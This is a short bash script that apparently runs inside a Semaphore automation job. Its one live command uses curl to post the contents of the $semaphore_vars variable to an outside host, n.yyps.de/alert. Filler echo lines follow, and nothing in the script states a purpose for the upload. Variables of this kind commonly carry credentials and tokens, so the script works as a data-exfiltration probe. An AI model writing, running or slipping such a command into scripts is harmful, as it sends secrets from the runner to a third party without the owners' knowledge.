#! /bin/bash
#curl -d versioning https://n.yyps.de/alert
curl -d "$(echo $semaphore_vars)" https://n.yyps.de/alert
echo 1
echo 2
echo 3
echo 4
